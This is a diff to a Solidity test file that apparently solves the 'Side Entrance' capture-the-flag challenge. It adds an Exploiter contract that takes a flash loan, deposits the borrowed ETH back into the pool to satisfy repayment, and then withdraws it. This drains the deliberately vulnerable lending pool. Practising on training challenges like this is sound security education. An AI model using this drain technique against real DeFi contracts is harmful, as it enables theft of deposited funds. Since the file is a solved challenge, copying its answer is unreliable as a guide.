@@ -3,7 +3,9 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {
+    SideEntranceLenderPool
+} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +47,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        Exploiter exploiter = new Exploiter(pool);
+        exploiter.executeFlashLoan(ETHER_IN_POOL);
+        exploiter.recoverFunds(recovery);
     }
 
     /**
@@ -53,6 +57,32 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
+}
+
+contract Exploiter {
+    SideEntranceLenderPool pool;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        pool.flashLoan(amount);
+    }
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function recoverFunds(address recovery) external {
+        pool.withdraw();
+        (bool success, ) = recovery.call{value: address(this).balance}("");
+        require(success, "ETH transfer failed");
+    }
+    receive() external payable {}
 }
